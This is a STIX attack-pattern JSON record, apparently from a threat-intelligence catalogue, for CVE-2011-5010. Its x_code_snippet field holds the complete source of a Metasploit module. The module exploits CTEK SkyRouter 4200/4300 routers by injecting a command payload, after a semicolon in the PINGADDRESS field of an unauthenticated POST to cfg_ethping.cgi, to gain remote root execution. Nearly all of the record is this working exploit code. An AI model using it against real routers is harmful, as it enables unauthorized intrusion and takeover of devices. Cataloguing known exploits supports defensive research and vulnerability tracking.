{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ae0292cf-8e37-49c5-a5e1-97149aa7b7ac",
    "created": "2024-08-14T17:15:00.74081Z",
    "modified": "2024-08-14T17:15:00.740814Z",
    "name": "CTEK SkyRouter 4200 and 4300 Command Execution",
    "description": " This module exploits an unauthenticated remote root exploit within ctek SkyRouter 4200 and 4300. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/ctek_skyrouter.rb",
            "external_id": "ctek_skyrouter.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-5010"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CTEK SkyRouter 4200 and 4300 Command Execution',\n      'Description'    => %q{\n          This module exploits an unauthenticated remote root exploit within ctek SkyRouter 4200 and 4300.\n      },\n      'Author'         => [ 'savant42' ],  #with module help from kos\n      'License'        => MSF_LICENSE,\n      'References'     => [\n                  ['CVE', '2011-5010'],\n                  ['OSVDB', '77497']\n                ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 1024,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl telnet netcat netcat-e',\n            }\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2011-09-08', # CGI historical date :)\n      'DefaultTarget' => 0))\n\n  end\n\n  def exploit\n    post_data = \"MYLINK=%2Fapps%2Fa3%2Fcfg_ethping.cgi&CMD=u&PINGADDRESS=;\" + Rex::Text.uri_encode(payload.encoded) + \"+%26\"\n    uri    = '/apps/a3/cfg_ethping.cgi'\n    print_status(\"Sending HTTP request for #{uri}\")\n    res = send_request_cgi( {\n      'global' => true,\n      'uri'    => uri,\n      'method' => \"POST\",\n      'data' => post_data\n    }, 30)\n\n    if res\n      print_status(\"The server responded with HTTP CODE #{res.code}\")\n    else\n      print_status(\"The server did not respond to our request\")\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-09-08, # CGI historical date :",
    "x_mitre_platforms": [
        "unix'"
    ]
}